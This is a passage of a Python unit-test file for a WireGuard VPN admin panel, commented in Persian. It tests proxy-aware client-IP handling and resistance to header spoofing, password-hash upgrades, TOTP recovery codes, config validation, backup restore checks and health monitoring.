        self.assertEqual(m.warp_targets_read(), ["gemini.google.com"])
        self.assertEqual([f for f in os.listdir(self.tmp)
                          if f.startswith("warp-targets") and f.endswith(".tmp")], [])
        self.assertEqual(stat.S_IMODE(os.stat(m.WARP_TARGETS).st_mode), 0o600)

    # ---- CSS ------------------------------------------------------------------
    def test_css_tokens_used_by_the_rbac_ui_are_defined(self):
        src = _read_panel_source()
        root = re.search(r":root\{(.*?)\}", src, re.S).group(1)
        self.assertIn("--line:", root)
        self.assertIn("--accent:", root)
        # هیچ پس‌زمینه‌ی تیره‌ی هاردکد داخلِ HTML ِ ساخته‌شده در JS (تمِ روشن)
        self.assertIsNone(re.search(r"'[^'\n]*background:#0d1117", src))


class ProductAuthTests(unittest.TestCase):
    """بهبودهای حساب و احراز هویت: proxy ِ معتمد، تگِ PBKDF2 و rehash،
    اعتبارسنجیِ config، کدهای بازیابیِ TOTP، مهلتِ بی‌کاریِ نشست."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-auth-")
        self.m = load_module(self.tmp)
        m = self.m
        with open(os.path.join(self.tmp, "wgtest.conf"), "w",
                  encoding="utf-8") as f:
            f.write(FIXTURE_CONF)
        salt = "a" * 32
        # کاربرِ **قدیمی**: هش با ۲۰۰k تکرار و بدونِ کلیدِ pbkdf2_iters
        m.CONFIG["users"] = [
            {"username": "admin", "salt": salt,
             "hash": m.hash_password("secret-pw", salt, m._PBKDF2_LEGACY_ITERS),
             "role": "admin", "totp": "", "stoken": "s1", "active": True}]
        m.save_config = lambda: None
        m._login_attempts.clear(); m._login_attempts_user.clear()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _post(self, path, body, session=True, headers=None, client_ip="127.0.0.1"):
        h = make_fake_handler(
            self.m, path=path, method="POST", body=body, headers=headers,
            client_ip=client_ip,
            session=({"u": "admin", "r": "admin"} if session else None))
        h.do_POST()
        return (dict(h.sent).get("__code__"),
                json.loads(b"".join(h.body).decode("utf-8") or "{}"), h)

    # ---- trusted proxies ----------------------------------------------------
    def test_client_ip_ignores_forwarded_headers_without_trusted_proxies(self):
        m = self.m
        m.CONFIG.pop("trusted_proxies", None)
        hdr = {"X-Forwarded-For": "203.0.113.9", "X-Real-IP": "203.0.113.9"}
        self.assertEqual(m.client_ip_from("127.0.0.1", hdr), "127.0.0.1")

    def test_client_ip_from_a_trusted_proxy_is_the_last_untrusted_hop(self):
        m = self.m
        m.CONFIG["trusted_proxies"] = ["127.0.0.1", "10.0.0.0/8"]
        f = m.client_ip_from
        self.assertEqual(f("127.0.0.1", {"X-Forwarded-For": "203.0.113.9"}),
                         "203.0.113.9")
        # زنجیره: کلاینت، proxy ِ داخلی، proxy ِ لبه — معتمدها از راست کنار می‌روند
        self.assertEqual(f("127.0.0.1", {"X-Forwarded-For":
                                         "198.51.100.7, 203.0.113.9, 10.1.2.3"}),
                         "203.0.113.9")
        self.assertEqual(f("127.0.0.1", {"X-Real-IP": "203.0.113.9"}), "203.0.113.9")
        self.assertEqual(f("127.0.0.1", {"X-Forwarded-For": "[2001:db8::5]"}),
                         "2001:db8::5")
        self.assertEqual(f("127.0.0.1", {"X-Forwarded-For": "203.0.113.9:443"}),
                         "203.0.113.9")
        # peer ِ نامعتمد با هدرِ جعلی → همان peer
        self.assertEqual(f("198.51.100.1", {"X-Forwarded-For": "127.0.0.1"}),
                         "198.51.100.1")
        # هدرِ خراب → نامعلوم (نه crash، نه اعتماد، نه loopback ِ peer)
        self.assertEqual(f("127.0.0.1", {"X-Forwarded-For": "not-an-ip"}),
                         m.UNKNOWN_CLIENT_IP)
        # فقط proxyها در زنجیره → چپ‌ترین، نه peer
        self.assertEqual(f("127.0.0.1", {"X-Forwarded-For": "10.9.9.9"}),
                         "10.9.9.9")
        # بدونِ هیچ هدری → peer (SSH port-forward ِ مستقیم)
        self.assertEqual(f("127.0.0.1", {}), "127.0.0.1")

    def test_forwarded_headers_cannot_forge_loopback_or_another_client(self):
        """جعلِ X-Forwarded-For پشتِ proxy ِ معتمد.

        nginx با فقط `proxy_set_header X-Real-IP $remote_addr` هدرِ XFF ِ
        کلاینت را دست‌نخورده رد می‌کند. XFF بر X-Real-IP مقدم بود و
        مقدارِ خراب یا «فقط-معتمد» به peer (127.0.0.1) برمی‌گشت — یعنی
        دور زدنِ allowlist و تأییدِ تلگرام.
        """
        m = self.m
        m.CONFIG["trusted_proxies"] = ["127.0.0.1", "10.0.0.0/8"]
        f = m.client_ip_from
        attacker = "198.51.100.7"
        for forged in ("127.0.0.1", "not-an-ip", "203.0.113.9", "::1"):
            with self.subTest(forged=forged):
                got = f("127.0.0.1", {"X-Forwarded-For": forged,
                                      "X-Real-IP": attacker})
                self.assertNotIn(got, ("127.0.0.1", "::1", "203.0.113.9"))
        # nginx ِ رایج: هر دو از $remote_addr → هم‌خوان
        self.assertEqual(f("127.0.0.1", {"X-Forwarded-For": "1.1.1.1, " + attacker,
                                         "X-Real-IP": attacker}), attacker)
        # X-Real-IP ِ معتمد (proxy ِ داخلی) با XFF تعارض حساب نمی‌شود
        self.assertEqual(f("127.0.0.1", {"X-Forwarded-For": attacker + ", 10.1.1.1",
                                         "X-Real-IP": "10.1.1.1"}), attacker)
        # loopback ِ آمده از هدر هیچ‌وقت کلاینت نیست
        self.assertEqual(f("127.0.0.1", {"X-Real-IP": "127.0.0.1"}),
                         m.UNKNOWN_CLIENT_IP)

    def test_forwarded_proto_makes_https_links_and_secure_cookies(self):
        """پشتِ proxy ِ TLS‌دار لینکِ اشتراک https و کوکی Secure باشد —
        ولی X-Forwarded-Proto فقط از proxy ِ معتمد."""
        m = self.m
        m.CONFIG.pop("tls_cert", None)
        m.CONFIG["trusted_proxies"] = ["127.0.0.1"]
        f = m.request_is_https
        self.assertTrue(f("127.0.0.1", {"X-Forwarded-Proto": "https"}))
        self.assertTrue(f("127.0.0.1", {"X-Forwarded-Proto": "HTTPS, http"}))
        self.assertFalse(f("127.0.0.1", {"X-Forwarded-Proto": "http"}))
        self.assertFalse(f("127.0.0.1", {}))
        self.assertFalse(f("198.51.100.1", {"X-Forwarded-Proto": "https"}))
        m.CONFIG.pop("trusted_proxies")
        self.assertFalse(f("127.0.0.1", {"X-Forwarded-Proto": "https"}))
        m.CONFIG["trusted_proxies"] = ["127.0.0.1"]
        m.add_peer("wgtest", "shr", use_psk=False)
        hdr = {"X-Forwarded-Proto": "https", "Host": "panel.example",
               "X-Forwarded-For": "203.0.113.9"}
        code, obj, _h = self._post("/api/peer/share",
                                   {"iface": "wgtest", "name": "shr"},
                                   headers=hdr)
        self.assertTrue(obj["url"].startswith("https://panel.example/s/"), obj)
        h = make_fake_handler(m, path="/api/logout", method="POST",
                              headers=hdr, session={"u": "admin", "r": "admin"})
        h.do_POST()
        self.assertIn("Secure", dict(h.sent).get("Set-Cookie", ""))
        u = m.CONFIG["users"][0]
        self.assertIn("Secure", h._session_cookie_header(u))

    def test_every_forwarded_for_line_is_read(self):
        """HAProxy XFF را سطرِ جدا اضافه می‌کند؛ سطرِ اول مالِ مهاجم است."""
        import email.message
        m = self.m
        m.CONFIG["trusted_proxies"] = ["127.0.0.1"]
        hdr = email.message.Message()
        hdr["X-Forwarded-For"] = "203.0.113.9"        # از کلاینت
        hdr["X-Forwarded-For"] = "198.51.100.7"       # از proxy
        self.assertEqual(m.client_ip_from("127.0.0.1", hdr), "198.51.100.7")

    def test_handler_uses_the_forwarded_ip_for_allowlist_and_audit(self):
        m = self.m
        m.CONFIG["trusted_proxies"] = ["127.0.0.1"]
        m.CONFIG["allow_ips"] = ["203.0.113.0/24"]
        # کلاینتِ واقعی خارج از allowlist، از پشتِ proxy → ۴۰۳
        code, obj, _h = self._post("/api/peer/ping", {"iface": "wgtest", "name": "user02"},
                                   headers={"X-Forwarded-For": "198.51.100.9"})
        self.assertEqual(code, 403)
        code, obj, _h = self._post("/api/peer/ping", {"iface": "wgtest", "name": "user02"},
                                   headers={"X-Forwarded-For": "203.0.113.9"})
        self.assertEqual(code, 200)

    def test_config_with_bad_trusted_proxy_is_refused_at_boot(self):
        m = self.m
        m.CONFIG["trusted_proxies"] = ["nope"]
        fatal, _w = m.validate_config(m.CONFIG)
        self.assertTrue(any("trusted_proxies" in f for f in fatal))

    # ---- PBKDF2 ------------------------------------------------------------------
    def test_legacy_hash_still_verifies_and_is_upgraded_on_login(self):
        m = self.m
        u = m.CONFIG["users"][0]
        self.assertTrue(m.check_user_password(u, "secret-pw"))
        self.assertFalse(m.check_user_password(u, "wrong"))
        self.assertEqual(m.user_pbkdf2_iters(u), m._PBKDF2_LEGACY_ITERS)
        old_hash = u["hash"]
        code, obj, _h = self._post("/api/login", {"username": "admin",
                                                 "password": "secret-pw"},
                                   session=False)
        self.assertTrue(obj.get("ok"), obj)
        self.assertEqual(u["pbkdf2_iters"], m.PBKDF2_ITERS)
        self.assertNotEqual(u["hash"], old_hash)
        self.assertTrue(m.check_user_password(u, "secret-pw"))
        # دومین ورود دیگر rehash نمی‌کند
        self.assertFalse(m.rehash_user_password(u, "secret-pw"))
        with open(m.ACTION_LOG, encoding="utf-8") as f:
            self.assertEqual(f.read().count("password hash upgraded"), 1)

    def test_new_hashes_carry_the_iteration_count(self):
        m = self.m
        u = m.CONFIG["users"][0]
        m.set_user_password(u, "another-pw")
        self.assertEqual(u["pbkdf2_iters"], m.PBKDF2_ITERS)
        self.assertTrue(m.check_user_password(u, "another-pw"))
        code, obj, _h = self._post("/api/users/add", {"username": "bob",
                                                     "password": "bobpass123",
                                                     "role": "viewer"})
        self.assertTrue(obj["ok"], obj)
        bob = m.find_user("bob")
        self.assertEqual(bob["pbkdf2_iters"], m.PBKDF2_ITERS)
        self.assertTrue(m.check_user_password(bob, "bobpass123"))

    def test_a_non_hex_salt_no_longer_crashes_the_password_check(self):
        m = self.m
        u = dict(m.CONFIG["users"][0], salt="zz")
        self.assertFalse(m.check_user_password(u, "secret-pw"))

    # ---- validate_config -----------------------------------------------------
    def test_validate_config_accepts_the_test_config(self):
        m = self.m
        fatal, _warn = m.validate_config(m.CONFIG)
        self.assertEqual(fatal, [])

    def test_validate_config_reports_the_classic_mistakes(self):
        m = self.m
        base = json.loads(json.dumps(m.CONFIG))
        cases = {
            "users not a list": dict(base, users={"a": 1}),
            "bad port": dict(base, port="8787"),
            "tls half": dict(base, tls_cert="/x.pem"),
            "tls missing file": dict(base, tls_cert="/nope.pem", tls_key="/nope.key"),
            "bad allow_ips": dict(base, allow_ips=["300.1.1.1"]),
        }
        for label, cfg in cases.items():
            with self.subTest(case=label):
                fatal, _w = m.validate_config(cfg)
                self.assertTrue(fatal, label)
        # هشدار (نه fatal): نقشِ تعریف‌نشده، بدونِ کاربر
        fatal, warn = m.validate_config(
            dict(base, users=[dict(base["users"][0], role="ghost")]))
        self.assertEqual(fatal, [])
        self.assertTrue(any("ghost" in w for w in warn))
        fatal, warn = m.validate_config(dict(base, users=[]))
        self.assertEqual(fatal, [])
        self.assertTrue(warn)

    def test_one_broken_user_does_not_stop_the_panel(self):
        """خرابیِ یک رکوردِ کاربر هشدار است، نه fatal؛ همان کاربر کنار
        می‌رود و بقیه کار می‌کنند.

        پیش از این یک salt ِ غلط در رکوردِ یک اپراتورِ فرعی کلِ پنل را —
        با اعمالِ سهمیه و انقضا و ربات — بعد از ری‌استارت از کار می‌انداخت.
        """
        m = self.m
        base = json.loads(json.dumps(m.CONFIG))
        good = base["users"][0]
        bad = {
            "user not an object": "admin2",
            "bad username": dict(good, username="a b"),
            "duplicate": dict(good),
            "missing role": {k: v for k, v in dict(good, username="nr").items()
                             if k != "role"},
            "non-hex salt": dict(good, username="hx", salt="xyz"),
            "bad expires": dict(good, username="ex", expires="tomorrow"),
        }
        for label, rec in bad.items():
            with self.subTest(case=label):
                cfg = dict(base, users=[good, rec])
                fatal, warn = m.validate_config(cfg)
                self.assertEqual(fatal, [], label)
                self.assertTrue(any("users[1] is ignored" in w for w in warn),
                                warn)
                self.assertEqual([i for i, _n, _e in m.invalid_users(cfg)], [1])
        # قرنطینه: از حافظه بیرون، ولی در ذخیره‌ی بعدی دست‌نخورده برمی‌گردد
        # (ماژولِ تازه، چون setUp ِ این کلاس save_config را خنثی کرده است)
        m2 = load_module(self.tmp)
        rec = bad["non-hex salt"]
        m2.CONFIG["users"] = [good, rec]
        got = m2.quarantine_invalid_users()
        self.assertEqual([(i, n) for i, n, _e in got], [(1, "hx")])
        self.assertIsNone(m2.find_user("hx"))
        self.assertIsNotNone(m2.find_user("admin"))
        m2.save_config()
        with open(m2.CONFIG_PATH, encoding="utf-8") as f:
            on_disk = json.load(f)
        self.assertEqual([u["username"] for u in on_disk["users"]],
                         ["admin", "hx"])
        self.assertEqual(on_disk["users"][1]["salt"], "xyz")
        self.assertEqual(len(m2.CONFIG["users"]), 1)

    # ---- TOTP recovery codes --------------------------------------------------
    def _enable_totp(self):
        m = self.m
        code, obj, _h = self._post("/api/totp/setup", {})
        secret = obj["secret"]
        code, obj, _h = self._post("/api/totp/confirm", {"code": m.totp_code(secret)})
        self.assertTrue(obj["ok"], obj)
        return secret, obj["recovery_codes"]

    def test_confirming_totp_hands_out_hashed_recovery_codes(self):
        m = self.m
        secret, codes = self._enable_totp()
        u = m.CONFIG["users"][0]
        self.assertEqual(len(codes), m.TOTP_RECOVERY_COUNT)
        self.assertEqual(len(set(codes)), len(codes))
        for c in codes:
            self.assertRegex(c, r"^[a-z0-9]{5}-[a-z0-9]{5}$")
        # روی دیسک فقط هش
        self.assertEqual(len(u["totp_recovery"]), len(codes))
        for c in codes:
            self.assertNotIn(c, json.dumps(u))
            self.assertIn(m._recovery_hash(c), u["totp_recovery"])

    def test_a_recovery_code_logs_in_once_in_place_of_the_totp(self):
        m = self.m
        events = []
        m.ALERTS.event = lambda k, t: events.append((k, t))
        secret, codes = self._enable_totp()
        m._login_attempts.clear(); m._login_attempts_user.clear()
        # بدونِ کد → totp_required
        code, obj, _h = self._post("/api/login", {"username": "admin",
                                                 "password": "secret-pw"},
                                   session=False)
        self.assertTrue(obj.get("totp_required"))
        # با کدِ بازیابی (حروفِ بزرگ و فاصله هم تحمل می‌شود)
        rc = codes[0].upper().replace("-", " - ")
        code, obj, h = self._post("/api/login", {"username": "admin",
                                                "password": "secret-pw",
                                                "totp": rc}, session=False)
        self.assertTrue(obj.get("ok"), obj)
        self.assertTrue(any(k == "Set-Cookie" for k, _v in h.sent))
        self.assertEqual(len(m.CONFIG["users"][0]["totp_recovery"]),
                         m.TOTP_RECOVERY_COUNT - 1)
        self.assertEqual(events[-1][0], "login")
        self.assertIn("admin", events[-1][1])
        rows = m.META.audit_list(category="auth", limit=5)
        self.assertIn("auth.totp.recovery", [r["action"] for r in rows])
        # همان کد دوباره → رد
        code, obj, _h = self._post("/api/login", {"username": "admin",
                                                 "password": "secret-pw",
                                                 "totp": codes[0]}, session=False)
        self.assertEqual(code, 401)
        # کدِ TOTP ِ واقعی همچنان کار می‌کند — کدِ گامِ بعد، چون کدِ همین
        # گام در /api/totp/confirm مصرف شد و تکرارش (درست) رد می‌شود
        code, obj, _h = self._post("/api/login", {"username": "admin",
                                                 "password": "secret-pw",
                                                 "totp": m.totp_code(
                                                     secret, time.time() + 30)},
                                   session=False)
        self.assertTrue(obj.get("ok"), obj)

    def test_a_recovery_code_is_accepted_without_its_dash(self):
        """از روی کاغذ خط‌تیره جا می‌افتد یا خطِ تیره‌ی دیگری چسبانده می‌شود."""
        m = self.m
        u = {"username": "admin"}
        codes = m.totp_recovery_codes(u)
        self.assertTrue(m.totp_recovery_consume(u, codes[0].replace("-", "")))
        self.assertTrue(m.totp_recovery_consume(u, codes[1].replace("-", "\u2013").upper()))
        self.assertFalse(m.totp_recovery_consume(u, codes[0].replace("-", "")))
        self.assertFalse(m.totp_recovery_consume(u, codes[2][:9]))
        self.assertEqual(len(u["totp_recovery"]), m.TOTP_RECOVERY_COUNT - 2)

    def test_recovery_codes_leave_the_dom_and_have_their_own_copy_label(self):
        src = _read_panel_source()
        seg = src[src.index("async function confirmTotp(){"):]
        seg = seg[:seg.index("async function disableTotp(){")]
        self.assertIn("ui.js.confirmTotp.5", seg)
        self.assertNotIn("ui.js.showShareResult.8", seg,
                         "دکمه‌ی کپیِ کدها برچسبِ «کپی لینک» دارد")
        self.assertIn("MutationObserver", seg)
        self.assertIn("el('modal-body').innerHTML = ''", seg)

    def test_disabling_totp_drops_the_recovery_codes(self):
        m = self.m
        self._enable_totp()
        code, obj, _h = self._post("/api/totp/disable", {"password": "secret-pw"})
        self.assertTrue(obj["ok"], obj)
        self.assertNotIn("totp_recovery", m.CONFIG["users"][0])
        # بدونِ TOTP، کدی که شبیهِ کدِ بازیابی است هیچ‌جا پذیرفته نمی‌شود
        self.assertFalse(m.totp_recovery_consume(m.CONFIG["users"][0], "abcde-fghjk"))

    # ---- idle timeout -----------------------------------------------------------
    def test_session_idle_timeout_is_off_by_default_and_expires_when_set(self):
        m = self.m
        u = m.CONFIG["users"][0]
        m.CONFIG.pop("session_idle_min", None)
        ck = m.make_session_cookie(u)
        self.assertIsNotNone(m.verify_session_cookie(ck))
        nonce = json.loads(base64.urlsafe_b64decode(
            ck.split(".")[0] + "=" * (-len(ck.split(".")[0]) % 4)))["n"]
        m._session_seen[nonce] = time.time() - 10 * 3600
        self.assertIsNotNone(m.verify_session_cookie(ck),
                             "بدونِ تنظیم، بی‌کاری نباید نشست را ببندد")
        m.CONFIG["session_idle_min"] = 30
        self.assertIsNone(m.verify_session_cookie(ck))       # ۱۰ ساعت بی‌کار
        self.assertNotIn(nonce, m._session_seen)
        ck2 = m.make_session_cookie(u)
        self.assertIsNotNone(m.verify_session_cookie(ck2))   # اولین دیدار
        self.assertIsNotNone(m.verify_session_cookie(ck2))   # فعالیت به‌روز می‌شود


class ProductWireGuardTests(unittest.TestCase):
    """بهبودهای WireGuard: مدلِ زیرشبکه، هم‌پوشانیِ AllowedIPs، fsync،
    یک بکاپ برای bulk، اعتبارسنجی و پیش‌نمایشِ بازیابی."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-wg-")
        self.m = load_module(self.tmp)
        with open(os.path.join(self.tmp, "wgtest.conf"), "w",
                  encoding="utf-8") as f:
            f.write(FIXTURE_CONF)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _write_conf(self, text):
        with open(os.path.join(self.tmp, "wgtest.conf"), "w",
                  encoding="utf-8") as f:
            f.write(text)

    # ---- زیرشبکه -------------------------------------------------------------
    def test_iface_subnet_honours_the_real_prefix_and_config(self):
        m = self.m
        m.CONFIG.pop("user_subnets", None)
        self.assertEqual(m.iface_subnet("wgtest"), "192.168.188.0/24")  # /32 → /24
        self._write_conf(FIXTURE_CONF.replace("Address = 192.168.188.1/32",
                                              "Address = 10.8.0.1/22, fd00:8::1/64"))
        self.assertEqual(m.iface_subnet("wgtest"), "10.8.0.0/22")
        addrs = m.iface_addresses("wgtest")
        self.assertEqual([str(a.ip) for a in addrs], ["10.8.0.1", "fd00:8::1"])
        # config با آدرسِ میزبانی (غیرکانونیک) هم نرمال می‌شود، نه ValueError
        m.CONFIG["user_subnets"] = {"wgtest": "10.9.0.1/24"}
        self.assertEqual(m.iface_subnet("wgtest"), "10.9.0.0/24")
        m.CONFIG["user_subnets"] = {"wgtest": "garbage"}
        self.assertIsNone(m.iface_subnet("wgtest"))

    def test_next_free_ip_walks_the_whole_subnet_and_reserves_server_addresses(self):
        m = self.m
        m.CONFIG.pop("user_subnets", None)
        blocks = m.parse_user_blocks("wgtest")
        self.assertEqual(m.next_free_ip("wgtest", blocks), "192.168.188.10")
        # /22 با آدرسِ سرورِ غیرِ .1: از .10 شروع و بعد از .255 به .1.0 می‌رود
        self._write_conf(FIXTURE_CONF.replace("Address = 192.168.188.1/32",
                                              "Address = 10.8.0.77/22"))
        used = ["10.8.0.%d" % i for i in range(10, 256)] + ["10.8.1.0"]
        blocks = [{"allowed_ips": ip + "/32"} for ip in used]
        self.assertEqual(m.next_free_ip("wgtest", blocks), "10.8.1.1")
        blocks = [{"allowed_ips": "10.8.0.%d/32" % i} for i in range(10, 77)]
        self.assertEqual(m.next_free_ip("wgtest", blocks), "10.8.0.78")  # .77 سرور
        # فقط IPv6 → None (نه IndexError)
        self._write_conf(FIXTURE_CONF.replace("Address = 192.168.188.1/32",
                                              "Address = fd00::1/64"))
        self.assertIsNone(m.next_free_ip("wgtest", []))

    def test_ipv6_endpoint_host_is_bracketed(self):
        m = self.m
        self.assertEqual(m._endpoint_host("[2001:db8::1]:51820"), "2001:db8::1")
        self.assertEqual(m._endpoint_host("2001:db8::1"), "2001:db8::1")
        self.assertEqual(m._endpoint_host("vpn.example.com:51820"), "vpn.example.com")
        m.CONFIG["server_host"] = "2001:db8::9"
        conf = m.make_client_conf("PRIV", "192.168.188.10", "wgtest")
        self.assertIn("Endpoint = [2001:db8::9]:", conf)

    # ---- هم‌پوشانی AllowedIPs -------------------------------------------------
    def test_update_peer_ips_refuses_an_address_owned_by_another_peer(self):
        m = self.m
        ok, msg = m.update_peer_ips("wgtest", "user01", "192.168.188.20/32")
        self.assertFalse(ok)
        txt = m.api_text(msg, "en")
        self.assertIn("192.168.188.20/32", txt)
        self.assertIn("user02", txt)
        # هم‌پوشانیِ رنج هم رد می‌شود؛ آدرسِ خودِ peer آزاد است
        self.assertFalse(m.update_peer_ips("wgtest", "user01", "192.168.188.16/28")[0])
        self.assertTrue(m.update_peer_ips("wgtest", "user01",
                                          "192.168.188.14/32, 10.9.0.0/24")[0])
        self.assertIsNone(m.allowed_ips_conflict(["10.1.0.0/16"],
                                                 m.parse_user_blocks("wgtest")))

    # ---- دوام و بکاپ ----------------------------------------------------------
    def test_write_conf_atomic_fsyncs_file_and_directory(self):
        m = self.m
        synced = []
        real = m.os.fsync
        m.os = types.SimpleNamespace(**{k: getattr(m.os, k) for k in dir(m.os)
                                        if not k.startswith("__")})
        m.os.fsync = lambda fd: (synced.append(fd), real(fd))
        m.write_conf_atomic(os.path.join(self.tmp, "wgtest.conf"), ["[Interface]", "x"])
        self.assertGreaterEqual(len(synced), 2)     # فایل + دایرکتوری

    def test_bulk_add_takes_one_backup_for_the_whole_batch(self):
        m = self.m
        m.CONFIG.pop("user_subnets", None)
        bdir = os.path.join(self.tmp, "backups")
        res, err = m.bulk_add_peers("wgtest", "b-", 1, 5, use_psk=False)
        self.assertIsNone(err)
        self.assertEqual(len(res["created"]), 5)
        self.assertEqual(len(os.listdir(bdir)), 1)
        # افزودنِ تکی هنوز بکاپ می‌گیرد
        m.add_peer("wgtest", "single", use_psk=False)
        self.assertEqual(len(os.listdir(bdir)), 2)

    # ---- بازیابی: اعتبارسنجی و dry-run ----------------------------------------
    def _tar(self, members):
        import io as _io
        import tarfile as _tf
        buf = _io.BytesIO()
        with _tf.open(fileobj=buf, mode="w:gz") as t:
            for nm, data in members.items():
                info = _tf.TarInfo(nm)
                info.size = len(data)
                t.addfile(info, _io.BytesIO(data))
        return buf.getvalue()

    def test_restore_rejects_a_corrupt_config_or_database(self):
        m = self.m
        orig = pathlib.Path(self.tmp, "wgtest.conf").read_text()
        for bad, why in ((b"CORRUPTED", "no [Interface]"),
                         (b"[Interface]\nAddress = 1.2.3.4/24\n", "PrivateKey"),
                         (b"\xff\xfe[Interface]", "UTF-8")):
            with self.subTest(why=why):
                ok, msg = m.restore_from_tar(self._tar({"wgtest.conf": bad}))
                self.assertFalse(ok)
                self.assertIn(why, m.api_text(msg, "en"))
        ok, msg = m.restore_from_tar(self._tar({"traffic.db": b"NEWDB"}))
        self.assertFalse(ok)
        self.assertIn("SQLite", m.api_text(msg, "en"))
        # هیچ‌چیز تغییر نکرده و اسنپ‌شاتی هم گرفته نشده
        self.assertEqual(pathlib.Path(self.tmp, "wgtest.conf").read_text(), orig)
        self.assertFalse(os.path.exists(os.path.join(self.tmp, "restore-backups")))

    def test_restore_dry_run_reports_the_peer_diff_without_writing(self):
        m = self.m
        new_conf = FIXTURE_CONF.replace(
            "#!!!user01\n#[Peer]\n#PublicKey = PUB_USER01_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=\n"
            "#AllowedIPs = 192.168.188.14/32\n",
            "#!!!user01\n[Peer]\nPublicKey = PUB_USER01_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=\n"
            "AllowedIPs = 192.168.188.14/32\n").replace(
            "#!!!user03\n#[Peer]\n#PublicKey = PUB_USER03_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=\n"
            "#AllowedIPs = 192.168.188.21/32\n",
            "#!!!user09\n[Peer]\nPublicKey = PUB_USER09_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=\n"
            "AllowedIPs = 192.168.188.99/32\n")
        before = pathlib.Path(self.tmp, "wgtest.conf").read_text()
        del m._run_calls[:]
        ok, plan = m.restore_from_tar(self._tar({"wgtest.conf": new_conf.encode()}),
                                      dry_run=True)
        self.assertTrue(ok, plan)
        d = plan["ifaces"]["wgtest"]
        self.assertEqual(d["add"], ["user09"])
        self.assertEqual(d["remove"], ["user03"])
        self.assertEqual(d["change"], ["user01"])          # فعال شد
        self.assertEqual((d["peers_now"], d["peers_after"]), (3, 3))
        self.assertEqual(plan["files"], [os.path.join(self.tmp, "wgtest.conf")]
                         if not self.tmp.startswith(m.BASE_DIR) else ["wgtest.conf"])
        self.assertEqual(pathlib.Path(self.tmp, "wgtest.conf").read_text(), before)
        self.assertEqual([c for c in m._run_calls if c[:2] == ["wg", "set"]], [])
        self.assertFalse(os.path.exists(os.path.join(self.tmp, "restore-backups")))

    def test_restore_route_honours_the_dry_run_header(self):
        m = self.m
        salt = "a" * 32
        m.CONFIG["users"] = [{"username": "admin", "salt": salt,
                              "hash": m.hash_password("pw-12345", salt),
                              "pbkdf2_iters": m.PBKDF2_ITERS, "role": "admin",
                              "totp": "", "stoken": "s", "active": True}]
        m.save_config = lambda: None
        raw = self._tar({"wgtest.conf": FIXTURE_CONF.encode()})
        h = make_fake_handler(m, path="/api/restore", method="POST", body=raw,
                              headers={"X-Confirm-Password": "pw-12345",
                                       "X-Dry-Run": "1"},
                              session={"u": "admin", "r": "admin"})
        h.do_POST()
        obj = json.loads(b"".join(h.body).decode())
        self.assertTrue(obj["ok"], obj)
        self.assertIn("wgtest", obj["plan"]["ifaces"])
        self.assertEqual(obj["plan"]["ifaces"]["wgtest"]["add"], [])
        self.assertFalse(os.path.exists(os.path.join(self.tmp, "restore-backups")))
        # بدونِ هدر: بازیابیِ واقعی
        h = make_fake_handler(m, path="/api/restore", method="POST", body=raw,
                              headers={"X-Confirm-Password": "pw-12345"},
                              session={"u": "admin", "r": "admin"})
        h.do_POST()
        obj = json.loads(b"".join(h.body).decode())
        self.assertTrue(obj["ok"], obj)
        self.assertTrue(os.path.exists(os.path.join(self.tmp, "restore-backups")))


class ProductMonitoringTests(unittest.TestCase):
    """بهبودهای پایش: ضربانِ نخ‌ها و /api/health، وضعیتِ ماندگارِ لبه‌ها،
    throttle ِ سنجش‌های گرانِ WARP، دایجست، tg_api و تکه‌کردنِ پیام."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-mon-")
        self.m = load_module(self.tmp)
        m = self.m
        m.ALERT_EDGES_STATE = os.path.join(self.tmp, "alert-edges.json")
        m.DIGEST_STATE = os.path.join(self.tmp, "digest.last")
        m.CONFIG["users"] = [{"username": "admin", "salt": "a" * 32, "hash": "h",
                              "role": "admin", "totp": "", "stoken": "s"},
                             {"username": "v", "salt": "a" * 32, "hash": "h",
                              "role": "viewer", "totp": "", "stoken": "s"}]
        m.CONFIG["metrics_token"] = "tok-123"

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    # ---- heartbeat / health ------------------------------------------------------
    def test_health_report_flags_a_silent_thread(self):
        m = self.m
        m._HEARTBEAT.clear()
        m._STARTED_AT = time.time() - 3600           # مهلتِ گرم‌شدن گذشته
        for name in m.HEARTBEAT_MAX_AGE:
            m._heartbeat(name)
        rep = m.health_report()
        self.assertTrue(rep["ok"])
        self.assertTrue(all(t["ok"] for t in rep["threads"].values()))
        with m._HEARTBEAT_LOCK:
            m._HEARTBEAT["sampler"] = time.time() - 999
            m._HEARTBEAT.pop("bot", None)
        rep = m.health_report()
        self.assertFalse(rep["ok"])
        self.assertFalse(rep["threads"]["sampler"]["ok"])
        self.assertFalse(rep["threads"]["bot"]["ok"])      # هیچ ضربانی و گرم نیست
        self.assertTrue(rep["threads"]["sysmon"]["ok"])
        # در مهلتِ گرم‌شدن، نخِ بی‌ضربان سالم شمرده می‌شود
        m._STARTED_AT = time.time()
        self.assertTrue(m.health_report()["threads"]["bot"]["ok"])

    def test_a_long_failing_telegram_cycle_keeps_the_bot_alive(self):
        """دورِ خرابی (تلگرامِ فیلتر روی چند مسیر) نباید نخ را «مرده» کند.

        هر مسیرِ نامزد تا timeout طول می‌کشد؛ با چند تونل یک دورِ getUpdates
        از سقفِ ۱۸۰ ثانیه می‌گذشت. هر تلاش باید پیشرفت را ثبت کند — و فقط
        برای نخی که خودش ضربان می‌زند.
        """
        m = self.m
        m._HEARTBEAT.clear()
        m._STARTED_AT = time.time() - 3600
        m.tg_iface_candidates = lambda explicit="": ["", "wg21", "wg22", "wg23"]
        tried = []

        def down(host, port, req, iface, timeout):
            # هر تلاش «۶۰ ثانیه» طول می‌کشد: ضربانِ قبلی را عقب می‌بریم
            with m._HEARTBEAT_LOCK:
                m._HEARTBEAT["bot"] -= 60
            tried.append(iface)
            raise OSError("timed out")
        m._https_raw_over_iface = down

        def bot_loop():
            m._heartbeat("bot")
